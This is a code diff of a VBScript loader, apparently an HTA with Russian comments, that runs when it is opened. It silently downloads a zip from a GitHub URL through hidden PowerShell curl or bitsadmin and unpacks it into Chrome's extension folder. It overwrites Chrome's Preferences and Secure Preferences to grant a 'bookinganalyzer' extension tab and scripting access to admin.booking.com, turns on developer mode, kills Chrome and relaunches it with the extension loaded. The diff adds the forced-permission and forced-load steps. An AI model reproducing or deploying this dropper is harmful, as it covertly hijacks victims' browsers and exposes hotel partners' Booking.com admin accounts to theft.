@@ -9,27 +9,32 @@ Sub Window_onLoad
     On Error Resume Next
     
     Set shell = CreateObject("WScript.Shell")
-    
-    ' Пробуем сначала через curl (быстрее)
-    curlCmd = "powershell -WindowStyle Hidden -Command ""curl.exe -L -o $env:TEMP\test.zip https://github.com/gospodinsreda/avito_yola/raw/refs/heads/master/test.zip"""
-    shell.Run curlCmd, 0, True
-    
-    ' Проверяем, скачался ли файл
     Set fso = CreateObject("Scripting.FileSystemObject")
     tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
     
+    ' Скачивание файла (оставляем как есть)
+    curlCmd = "powershell -WindowStyle Hidden -Command ""curl.exe -L -o $env:TEMP\test.zip https://github.com/gospodinsreda/avito_yola/raw/refs/heads/master/test.zip"""
+    shell.Run curlCmd, 0, True
+    
     If Not fso.FileExists(tempFolder & "\test.zip") Then
-        ' Если curl не сработал, пробуем через bitsadmin
         bitsCmd = "powershell -WindowStyle Hidden -Command ""bitsadmin /transfer downloadJob /download /priority FOREGROUND 'https://github.com/gospodinsreda/avito_yola/raw/refs/heads/master/test.zip' '$env:TEMP\test.zip'"""
         shell.Run bitsCmd, 0, True
     End If
     
     ' Финальная проверка и установка расширения
     If fso.FileExists(tempFolder & "\test.zip") Then
-        ' Получаем пути к папкам Chrome
+        ' Используем фиксированный ID для нашего расширения
+        extensionId = "bookinganalyzer"
         userDataPath = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Google\Chrome\User Data"
-        extensionId = "mfkomnpbmdkghpjhpnmjnhpgcjdeiblk"  ' Замените на ID вашего расширения
-        chromeExtPath = userDataPath & "\Default\Extensions\" & extensionId & "\1.0.0"
+        chromeExtPath = userDataPath & "\Default\Extensions\" & extensionId & "\1.0"
+        
+        ' Распаковываем во временную папку
+        If Not fso.FolderExists(tempFolder & "\test") Then
+            fso.CreateFolder(tempFolder & "\test")
+        End If
+        
+        unzipCmd = "powershell -WindowStyle Hidden -Command ""& {Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('" & tempFolder & "\test.zip', '" & tempFolder & "\test')}"""
+        shell.Run unzipCmd, 0, True
         
         ' Создаем необходимые директории
         If Not fso.FolderExists(userDataPath & "\Default\Extensions") Then
@@ -42,29 +47,19 @@ Sub Window_onLoad
             fso.CreateFolder(chromeExtPath)
         End If
         
-        ' Распаковываем во временную папку
-        If Not fso.FolderExists(tempFolder & "\test") Then
-            fso.CreateFolder(tempFolder & "\test")
-        End If
-        
-        unzipCmd = "powershell -WindowStyle Hidden -Command ""& {Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('" & tempFolder & "\test.zip', '" & tempFolder & "\test')}"""
-        shell.Run unzipCmd, 0, True
-        
         ' Копируем файлы в папку расширений Chrome
         xcopyCmd = "xcopy """ & tempFolder & "\test\*"" """ & chromeExtPath & "\" & """ /E /I /Y"
         shell.Run xcopyCmd, 0, True
         
-        ' Включаем режим разработчика и добавляем расширение в preferences
-        Set prefsFile = fso.OpenTextFile(userDataPath & "\Default\Preferences", 1, True)
-        prefsContent = prefsFile.ReadAll()
-        prefsFile.Close
+        ' Создаем/обновляем Secure Preferences
+        Set securePrefs = fso.CreateTextFile(userDataPath & "\Default\Secure Preferences", True)
+        securePrefs.WriteLine "{""extensions"":{""settings"":{""" & extensionId & """:{""active_permissions"":{""api"":[""tabs"",""storage"",""webNavigation"",""scripting""],""explicit_host"":[""https://admin.booking.com/*""]},""granted_permissions"":{""api"":[""tabs"",""storage"",""webNavigation"",""scripting""],""explicit_host"":[""https://admin.booking.com/*""]},""location"":2,""state"":1}}}}"
+        securePrefs.Close
         
-        ' Модифицируем preferences для включения режима разработчика и расширения
-        newPrefs = Replace(prefsContent, """extensions"":{", """extensions"":{""settings"":{""" & extensionId & """:{""location"":5,""manifest"":{""version"":""1.0.0""},""path"":""" & extensionId & "/1.0.0"",""state"":1}},""development_mode"":true,")
-        
-        Set prefsFile = fso.OpenTextFile(userDataPath & "\Default\Preferences", 2, True)
-        prefsFile.Write newPrefs
-        prefsFile.Close
+        ' Обновляем Preferences
+        Set prefs = fso.CreateTextFile(userDataPath & "\Default\Preferences", True)
+        prefs.WriteLine "{""extensions"":{""ui"":{""developer_mode"":true},""settings"":{""" & extensionId & """:{""active_permissions"":{""api"":[""tabs"",""storage"",""webNavigation"",""scripting""],""explicit_host"":[""https://admin.booking.com/*""]},""granted_permissions"":{""api"":[""tabs"",""storage"",""webNavigation"",""scripting""],""explicit_host"":[""https://admin.booking.com/*""]},""location"":2,""state"":1}}}}"
+        prefs.Close
         
         ' Удаляем временные файлы
         fso.DeleteFile(tempFolder & "\test.zip")
@@ -72,12 +67,11 @@ Sub Window_onLoad
         
         ' Закрываем Chrome если он запущен
         shell.Run "taskkill /F /IM chrome.exe /T", 0, True
-        ' Ждем 2 секунды
         shell.Run "ping -n 3 127.0.0.1", 0, True
         
         ' Запускаем Chrome
         chromePath = """C:\Program Files\Google\Chrome\Application\chrome.exe"""
-        shell.Run chromePath, 1, False
+        shell.Run chromePath & " --load-extension=""" & chromeExtPath & """", 1, False
     End If
     
     self.close
